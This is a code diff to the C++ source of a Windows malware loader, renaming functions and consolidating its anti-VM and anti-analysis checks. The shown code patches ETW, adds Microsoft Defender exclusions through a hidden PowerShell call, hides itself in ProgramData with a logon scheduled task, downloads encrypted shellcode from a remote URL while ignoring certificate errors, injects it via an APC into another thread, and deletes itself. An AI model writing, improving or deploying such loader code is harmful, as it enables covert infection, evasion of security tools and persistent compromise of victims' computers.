@@ -103,18 +103,6 @@ BOOL ETWPATCH() {
     return TRUE;
 }
 
-// Check if there are fewer than 100 processes
-BOOL CheckMachineProcesses() {
-    DWORD adwProcesses[1024], dwReturnLen = 0;
-    if (EnumProcesses(adwProcesses, sizeof(adwProcesses), &dwReturnLen)) {
-        DWORD dwNmbrOfPids = dwReturnLen / sizeof(DWORD);
-        if (dwNmbrOfPids < 100) {
-            return TRUE;
-        }
-    }
-    return FALSE;
-}
-
 BOOL FileExists(const std::wstring& filePath) {
     WIN32_FIND_DATAW findFileData;
     HANDLE hFind = FindFirstFileW(filePath.c_str(), &findFileData);
@@ -130,13 +118,18 @@ BOOL DirectoryExists(const std::wstring& dirPath) {
     return (fileAttrib != INVALID_FILE_ATTRIBUTES && (fileAttrib & FILE_ATTRIBUTE_DIRECTORY));
 }
 
-BOOL VMArtifactsDetect() {
-	std::wstring systemRoot(MAX_PATH, L'\0');
-    if (!GetEnvironmentVariableW(OBF(L"SystemRoot"), &systemRoot[0], MAX_PATH)) {
-        return FALSE;
+BOOL AntiVM() {
+    DWORD adwProcesses[1024], dwReturnLen = 0;
+    if (EnumProcesses(adwProcesses, sizeof(adwProcesses), &dwReturnLen)) {
+        DWORD dwNmbrOfPids = dwReturnLen / sizeof(DWORD);
+        if (dwNmbrOfPids < 104) {
+            return TRUE; 
+        }
     }
-    systemRoot.resize(wcslen(systemRoot.c_str()));
-    std::vector<std::wstring> badFileNames = {
+    std::wstring systemRoot(MAX_PATH, L'\0');
+    if (GetEnvironmentVariableW(OBF(L"SystemRoot"), &systemRoot[0], MAX_PATH)) {
+        systemRoot.resize(wcslen(systemRoot.c_str()));
+        std::vector<std::wstring> badFiles = {
         OBF(L"\\drivers\\vmmouse.sys"),
         OBF(L"\\drivers\\vmhgfs.sys"),
         OBF(L"\\drivers\\VBoxMouse.sys"),
@@ -147,6 +140,7 @@ BOOL VMArtifactsDetect() {
 		OBF(L"\\drivers\\balloon.sys"),
 		OBF(L"\\drivers\\netkvm.sys"),
 		OBF(L"\\drivers\\viofs.sys"),
+		OBF(L"\\drivers\\vioser.sys"),
         OBF(L"\\vboxdisp.dll"),
         OBF(L"\\vboxhook.dll"),
         OBF(L"\\vboxmrxnp.dll"),
@@ -155,95 +149,74 @@ BOOL VMArtifactsDetect() {
         OBF(L"\\vboxoglcrutil.dll"),
         OBF(L"\\vboxoglerrorspu.dll"),
         OBF(L"\\vboxoglfeedbackspu.dll")
-    };
+        };
+        for (const auto& file : badFiles) {
+            if (FileExists(systemRoot + OBF(L"\\System32") + file)) {
+                return TRUE; 
+            }
+        }
+    }
     std::vector<std::wstring> badDirs = {
         OBF(L"C:\\Program Files\\VMware"),
         OBF(L"C:\\Program Files\\Oracle\\VirtualBox Guest Additions")
     };
-    for (const auto& badFileName : badFileNames) {
-        if (FileExists(systemRoot + OBF(L"\\System32") + badFileName)) {
-            ExitProcess(1);
-        }
-    }
-    for (const auto& badDir : badDirs) {
-        if (DirectoryExists(badDir)) {
-            ExitProcess(1);
-        }
-    }
-    return FALSE;
-}
-
-// Check for specific processes and other VM-related indicators
-BOOL VMPROTECT() {
-    std::vector<std::wstring> processNames = {
-        OBF(L"autorunsc.exe"),
-        OBF(L"binaryninja.exe"),
-        OBF(L"dumpcap.exe"),
-        OBF(L"die.exe"),
-        OBF(L"autorunsc.exe"),
-        OBF(L"joeboxserver.exe"),
-        OBF(L"qga.exe"),
-        OBF(L"qemu-ga"),
-        OBF(L"sandman.exe"),
-        OBF(L"sysmon.exe"),
-        OBF(L"tcpdump.exe"),
-        OBF(L"sniff_hit.exe"),
-        OBF(L"vboxcontrol.exe"),
-        OBF(L"vboxservice.exe"),
-        OBF(L"vboxtray.exe"),
-        OBF(L"vt-windows-event-stream.exe"),
-        OBF(L"vmwaretray.exe"),
-        OBF(L"vmwareuser.exe"),
-        OBF(L"wireshark.exe"),
-        OBF(L"windbg.exe"),
-        OBF(L"xenservice.exe")
-    };
-    wchar_t localAppData[MAX_PATH];
-    DWORD result = GetEnvironmentVariableW(OBF(L"LOCALAPPDATA"), localAppData, MAX_PATH);
-    if (result > 0 && result < MAX_PATH) {
-        std::wstring filePath = std::wstring(localAppData) + OBF(L"\\Temp\\JSAMSIProvider64.dll");
-        if (GetFileAttributesW(filePath.c_str()) != INVALID_FILE_ATTRIBUTES) {
+    for (const auto& dir : badDirs) {
+        if (DirectoryExists(dir)) {
             return TRUE;
         }
-        wchar_t windir[MAX_PATH];
-        result = GetEnvironmentVariableW(OBF(L"WINDIR"), windir, MAX_PATH);
-        if (result > 0 && result < MAX_PATH) {
-            std::wstring exePath = std::wstring(windir) + OBF(L"\\psexesvc.exe");
-            if (GetFileAttributesW(exePath.c_str()) != INVALID_FILE_ATTRIBUTES) {
-                return TRUE;
-            }
-        }
     }
+    MEMORYSTATUSEX RAMStatus = { sizeof(RAMStatus) };
+    GlobalMemoryStatusEx(&RAMStatus);
+    if ((RAMStatus.ullTotalPhys / (1024ULL * 1024ULL)) < 6048) {
+        return TRUE; 
+    }
+    std::vector<std::wstring> badProcesses = {
+        OBF(L"autorunsc.exe"), 
+		OBF(L"binaryninja.exe"), 
+		OBF(L"dumpcap.exe"),
+        OBF(L"die.exe"), 
+		OBF(L"fakenet.exe"), 
+		OBF(L"joeboxserver.exe"), 
+		OBF(L"processhacker.exe"), 
+		OBF(L"procexp.exe"), 
+		OBF(L"qga.exe"),
+        OBF(L"qemu-ga"), 
+		OBF(L"sandman.exe"), 
+		OBF(L"sysmon.exe"),
+        OBF(L"tcpdump.exe"), 
+		OBF(L"sniff_hit.exe"), 
+		OBF(L"vboxcontrol.exe"),
+        OBF(L"vboxservice.exe"), 
+		OBF(L"vboxtray.exe"), 
+		OBF(L"vt-windows-event-stream.exe"),
+        OBF(L"vmsrvc.exe"), 
+		OBF(L"vmwaretray.exe"), 
+		OBF(L"vmwareuser.exe"), 
+		OBF(L"wireshark.exe"),
+        OBF(L"windbg.exe"), 
+		OBF(L"xenservice.exe")
+    };
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot != INVALID_HANDLE_VALUE) {
         PROCESSENTRY32W pe32 = { sizeof(PROCESSENTRY32W) };
         if (Process32FirstW(hSnapshot, &pe32)) {
             do {
-                for (const auto& processName : processNames) {
-                    if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
+                for (const auto& proc : badProcesses) {
+                    if (_wcsicmp(pe32.szExeFile, proc.c_str()) == 0) {
                         CloseHandle(hSnapshot);
-                        return TRUE;
+                        return TRUE; 
                     }
                 }
             } while (Process32NextW(hSnapshot, &pe32));
         }
         CloseHandle(hSnapshot);
     }
-
-    if (IsDebuggerPresent()) {
-        return TRUE;
-    }
-    if (CheckMachineProcesses()) {
-        return TRUE;
-    }
-    if (VMArtifactsDetect()) {
-        return TRUE;
-    }
-    return FALSE;
+    return FALSE; // No VM indicators found
 }
 
-void GetPayloadFromUrl(LPCWSTR szUrl, std::vector<BYTE>& payload) {
-    HINTERNET hInternet = InternetOpenW(OBF(L"PANDALOADER"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+
+void payloadurl(LPCWSTR szUrl, std::vector<BYTE>& payload) {
+    HINTERNET hInternet = InternetOpenW(OBF(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     HINTERNET hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS, 0);
     BYTE buffer[4096];
     DWORD bytesRead;
@@ -254,7 +227,7 @@ void GetPayloadFromUrl(LPCWSTR szUrl, std::vector<BYTE>& payload) {
     InternetCloseHandle(hInternet);
 }
 
-BOOL IsRunningAsAdmin() {
+BOOL admincheck() {
     BOOL isAdmin = FALSE;
     PSID administratorsGroup = NULL;
     SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
@@ -271,7 +244,7 @@ std::string get_executable_path() {
     return std::string(buffer);
 }
 
-BOOL is_in_directory(const std::string& directoryName) {
+BOOL existence(const std::string& directoryName) {
     std::string current_path = get_executable_path();
     std::string::size_type pos = current_path.find(directoryName);
     return (pos != std::string::npos);
@@ -292,7 +265,7 @@ std::string get_environment_variable(const std::string& varName) {
     return std::string(buffer);
 }
 
-void hide_directory_contents(const std::string& directoryPath) {
+void hidden(const std::string& directoryPath) {
     WIN32_FIND_DATAA findFileData;
     HANDLE hFind = FindFirstFileA((directoryPath + "\\*").c_str(), &findFileData);
     if (hFind == INVALID_HANDLE_VALUE) {
@@ -304,7 +277,7 @@ void hide_directory_contents(const std::string& directoryPath) {
             std::string fullPath = directoryPath + "\\" + fileName;
             SetFileAttributesA(fullPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
             if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-                hide_directory_contents(fullPath);
+                hidden(fullPath);
             }
         }
     } while (FindNextFileA(hFind, &findFileData) != 0);
@@ -312,7 +285,7 @@ void hide_directory_contents(const std::string& directoryPath) {
 }
 
 
-BOOL create_scheduled_task(const std::string& taskName, const std::string& executablePath) {
+BOOL persistence(const std::string& taskName, const std::string& executablePath) {
     std::wstring longPath = std::wstring(executablePath.begin(), executablePath.end());
     std::string command = std::string(OBF("Register-ScheduledTask -TaskName \"")) + taskName +
         std::string(OBF("\" -Trigger (New-ScheduledTaskTrigger -AtLogon) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -RunOnlyIfNetworkAvailable -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0) -Action (New-ScheduledTaskAction -Execute '")) +
@@ -321,7 +294,7 @@ BOOL create_scheduled_task(const std::string& taskName, const std::string& execu
     return 0;
 }
 
-void setup_directory_and_copy_exe() {
+void persist_folder() {
     std::string systemDrive = get_environment_variable(OBF("SystemDrive"));
     std::string programData = get_environment_variable(OBF("ProgramData"));
     std::string destDir = systemDrive + OBF("\\ProgramData\\") + DIRECTORY_NAME;
@@ -337,9 +310,9 @@ void setup_directory_and_copy_exe() {
     }
     if (HIDE_DIRECTORY) {
         SetFileAttributesA(destDir.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
-        hide_directory_contents(destDir);
+        hidden(destDir);
     }
-    create_scheduled_task(STARTUP_ENTRYNAME, destPath);
+    persistence(STARTUP_ENTRYNAME, destPath);
 }
 
 void XORDecrypt(std::vector<BYTE>& data, const std::string& key) {
@@ -354,7 +327,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
    junk_code();
    std::wstring exePathW = std::wstring(exePath.begin(), exePath.end());
    ETWPATCH();
-   if (ENABLE_ADMIN && !IsRunningAsAdmin()) {
+   if (ENABLE_ADMIN && !admincheck()) {
         LPCWSTR powershellPath = OBF(L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
         WCHAR cmdLine[MAX_PATH];
 #ifdef __MINGW32__
@@ -375,9 +348,11 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     }
     }
 #if ENABLE_ANTIVM
-    if (VMPROTECT()) {
+    if (AntiVM()) {
         ExitProcess(1);
     }
+#else
+    printf(OBF("AntiVM check is disabled.\n"));
 #endif
     if (SLEEP_DELAY) {
         static bool __s = false;
@@ -400,12 +375,12 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     if (ADD_EXCLUSION) {
         ShellExecute(NULL, OBF("open"), OBF("powershell"), OBF("Add-MpPreference -ExclusionPath @($env:userprofile, $env:programdata) -Force"), NULL, SW_HIDE);
     }
-    if (ENABLE_STARTUP && !is_in_directory(DIRECTORY_NAME)) {
-        setup_directory_and_copy_exe();
+    if (ENABLE_STARTUP && !existence(DIRECTORY_NAME)) {
+        persist_folder();
     }
     std::vector<BYTE> payload;
     LPCWSTR url = SHELLCODE_URL;
-    GetPayloadFromUrl(url, payload);
+    payloadurl(url, payload);
 	junk_code();
     std::string key = XOR_DECRYPTION_KEY;
     XORDecrypt(payload, key);
@@ -422,7 +397,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
     pwQueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
     ResumeThread(threadHandle);
-    if (MELT && !is_in_directory(DIRECTORY_NAME)) {
+    if (MELT && !existence(DIRECTORY_NAME)) {
         delete_current_executable();
     }
     return 0;
